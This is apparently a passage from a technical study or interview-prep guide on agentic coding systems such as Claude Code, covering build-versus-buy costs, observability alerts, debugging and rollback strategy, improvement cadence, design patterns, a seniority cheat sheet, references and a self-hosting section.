### Build vs Buy

| Capability | Build Cost | Buy Option | Recommendation |
|------------|------------|------------|----------------|
| LLM inference | $50M+ training | Claude API $3-15/1M tokens | Buy |
| Context management | $2M dev + $500K/yr | Integrated in Claude Code | Buy |
| Permission system | $1.5M dev | Custom (security-critical) | Build |
| MCP integrations | $200K/connector | Community servers | Buy |
| Sandbox infrastructure | $2.5M dev | gVisor/Firecracker | Buy |


## Observability & Production Debugging

### Key Metrics & Alerts

| Metric | Alert Threshold | Escalation |
|--------|----------------|------------|
| Task success rate (24h) | < 85% | Page on-call SRE |
| Context corruption rate | > 0.1% | Page principal engineer |
| Tool timeout rate | > 5% | Auto-disable affected tools |
| Permission escalation attempts | > 1% | Security team review |
| Mean decision latency | > 2.5s | Performance investigation |
| Sandbox escape attempts | > 0 | Immediate security incident |
| Session cost velocity | > $100/min | Auto-throttle + alert |

### Debugging Walkthrough

```
Agent Issue Reported
├── Wrong output?
│   ├── Check decision trace → Context corruption? → Rollback to checkpoint
│   └── Reasoning flawed? → Check compaction logs for lost causal edges
├── Timeout/hang?
│   ├── Tool execution stuck → Kill process, check resource limits
│   └── Context size exploded → Force compression, restart session
├── Unsafe action?
│   ├── Permission bypass → SECURITY INCIDENT
│   └── Misclassified risk → Update classification model
└── Incoherent after 2+ hours?
    ├── Check compression layer transitions for dropped state
    └── Compare decision confidence trend (should be stable, not declining)
```

### Versioning & Rollback

| What to Version | Rollback Strategy | Blast Radius |
|-----------------|-------------------|--------------|
| Base model | Semantic versioning, blue/green deploy | All users (15-30 min) |
| Agent runtime | Git SHA + feature flags | Configurable (2-5 min) |
| Tool definitions | Schema versioning + backward compat | Per-tool users (1-2 min) |
| Safety classifiers | Model checkpoints + A/B testing | All safety-gated actions |
| Context compressors | Algorithm versioning + fallbacks | Long-running sessions (30s) |
| Permission rules | Rule versioning + audit trail | Specific scopes (immediate) |

> [!experience]
> The most painful production incident involved a model rollback that fixed performance but broke context compression compatibility — 40K active sessions lost state simultaneously. Lesson: version context formats independently and maintain backward compatibility across 3+ model versions.


## Data Flywheel & Continuous Improvement

### Feedback Signals

| Signal | Value | Collection Method |
|--------|-------|-------------------|
| Task completion (pass/fail) | High | Automated test execution |
| User acceptance of edits | High | Accept/reject tracking |
| Session duration before abandon | Medium | Telemetry |
| Retry count per task | Medium | Loop instrumentation |
| User satisfaction score | Medium | Post-session survey |
| Manifest drift frequency | Low | Automated diff detection |

### Improvement Prioritization

| Cadence | What to Update | Gate Criteria |
|---------|----------------|---------------|
| Daily | Tool reliability rules, circuit breaker thresholds | Automated regression pass |
| Weekly | Permission classification model | No increase in false-positive rate |
| Monthly | Context compaction parameters | Retention accuracy > 95% on test set |
| Quarterly | Agent reasoning capabilities (model updates) | SWE-bench score non-regression [1] |


## Advanced Patterns Summary

| Pattern | What It Solves | When to Use | When NOT to Use |
|---------|---------------|-------------|-----------------|
| Worktree isolation | Multi-agent file conflicts | Parallel independent sub-tasks | Tightly coupled edits |
| Reflexion loops [5] | Single-attempt failures | Tasks with test feedback | No validation signal available |
| Spec-driven execution | Ambiguous requirements | Complex multi-step workflows | Simple one-shot edits |
| Risk-budget gating | Permission fatigue | High-frequency agent usage | Low-trust environments |
| Hierarchical compaction | Long-session context loss | Sessions > 1 hour | Short interactions (< 10 min) |
| MCP server federation | Multi-system orchestration | Enterprise environments | Single-tool workflows |
| Semantic merge | Multi-agent conflict resolution | Related file changes | Disjoint file sets |


## Seniority Signals Cheat Sheet

| What Staff Says | What Principal/DE Says |
|-----------------|----------------------|
| "We use an agentic loop with tool calls" | "The loop is trivial — the hard part is convergence detection and knowing when to stop" |
| "We sandbox with containers" | "Isolation is per-operation blast-radius bounding with sequence-level threat detection" |
| "Context gets summarized when too long" | "Compaction must preserve causal DAGs, not semantic similarity — ROUGE is irrelevant here" |
| "We run tests to validate output" | "Binary pass/fail misses partial correctness; we need pass@k with patch minimality" [1][2] |
| "Sub-agents run in parallel" | "Coordination overhead dominates beyond 5 agents — the decomposition quality matters more than parallelism" [8] |
| "We have permission prompts" | "Approval fatigue makes prompts security theater; risk budgets with behavioral sequence analysis actually work" |
| "MCP connects to external tools" | "The competitive moat is tool-graph breadth, not model quality — MCP is the ecosystem play" |


## References

### Foundational Papers
- [1] Jimenez et al. (2024) — SWE-bench: Can Language Models Resolve Real-World GitHub Issues? — arXiv:2310.06770 — Gold-standard benchmark for agentic coding evaluation on real issues
- [2] Chen et al. (2021) — Evaluating Large Language Models Trained on Code (Codex) — arXiv:2107.03374 — Introduced HumanEval and pass@k estimation for code generation
- [3] Yao et al. (2023) — ReAct: Synergizing Reasoning and Acting in Language Models — arXiv:2210.03629 — Foundational pattern for interleaved reasoning and tool use in agents
- [4] Schick et al. (2023) — Toolformer: Language Models Can Teach Themselves to Use Tools — arXiv:2302.04761 — Self-supervised tool learning demonstrating LLMs can acquire tool-use capability
- [5] Shinn et al. (2023) — Reflexion: Language Agents with Verbal Reinforcement Learning — arXiv:2303.11366 — Self-correction through episodic reflection memory improving task completion

### Agent Systems
- [6] Yang et al. (2024) — SWE-agent: Agent-Computer Interfaces Enable Automated Software Engineering — arXiv:2405.15793 — Demonstrated purpose-built ACIs outperform raw shell for coding agents
- [7] Zhang et al. (2024) — AutoCodeRover: Autonomous Program Improvement — arXiv:2404.05427 — Context-retrieval-based approach to autonomous bug fixing
- [8] Wu et al. (2023) — AutoGen: Enabling Next-Gen LLM Applications via Multi-Agent Conversation — arXiv:2308.08155 — Multi-agent conversation framework for complex task orchestration
- [9] Hong et al. (2023) — MetaGPT: Meta Programming for A Multi-Agent Collaborative Framework — arXiv:2308.00352 — Role-based multi-agent development with standardized operating procedures
- [10] Wang et al. (2024) — OpenDevin: An Open Platform for AI Software Developers — arXiv:2407.16741 — Open platform enabling reproducible agent development research

### Production & Implementation
- [11] Anthropic (2024-2026) — Claude Code Documentation — docs.anthropic.com — Official documentation for Claude Code architecture, MCP, and deployment patterns

### Evaluation & Benchmarks
- [12] Li et al. (2022) — Competition-Level Code Generation with AlphaCode — arXiv:2203.07814 — Large-scale sampling with filtering for competitive programming
- [13] Austin et al. (2021) — Program Synthesis with Large Language Models (MBPP) — arXiv:2108.07732 — Mostly Basic Programming Problems benchmark for code synthesis evaluation
- [14] Roziere et al. (2024) — Code Llama: Open Foundation Models for Code — arXiv:2308.12950 — Open-weight code models with infilling and long-context capabilities

### Surveys
- [15] Xi et al. (2023) — The Rise and Potential of Large Language Model Based Agents: A Survey — arXiv:2309.07864 — Comprehensive taxonomy of LLM-based agent architectures across planning, memory, and tool use

---

## Self-Hosting: Claude Code Developing Itself

> **Added:** 2026-06-07 | **Source:** Anthropic Engineering Blog, engineer statements

Anthropic confirms that Claude Code is used to develop Claude Code — a self-hosting pattern analogous to GCC compiling itself or Rust bootstrapping its own compiler.

### How It Works

- Engineers use Claude Code to write features, fix bugs, write tests, and refactor Claude Code's own TypeScript codebase
- The Claude Code repository contains its own `CLAUDE.md` instructing Claude Code how to work on itself
- Standard CI/CD (Jest/Vitest, human code review, conventional npm build)
- Always human-in-the-loop — no autonomous self-modification

### What This Means Architecturally

- **Tight feedback loop**: friction in using Claude Code → fix it (often using Claude Code) → deploy → repeat
- **Not recursive self-improvement**: the underlying model (Sonnet/Opus) is trained separately; CLI changes don't affect model weights
- **Quality signal**: if Claude Code can't effectively work on its own codebase, that's a real-world regression signal
- **~75% of Anthropic code is AI-assisted** (Dario Amodei, 2025 interviews) — Claude Code team among heaviest internal users

### Implications for Agent Design

The "use the tool to build the tool" pattern is viable when:
1. The tool's output can be verified by the tool's own test suite
2. A human reviews before merge (prevents degenerate loops)
3. The tool and the model powering it are architecturally separate (changes to one don't directly affect the other)

---

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-06-07 | Added self-hosting section | Confirmed Anthropic dogfoods Claude Code for its own development; documented how it works, what it means architecturally, and implications for agent design |
| 2026-05-31 | Initial v2 generation | Complete rewrite from v1: added Quick Catchup, State of the Art, diversified DE Probes across 6 sub-topics, added inline citations, removed appendix and sub-Q&A banks |
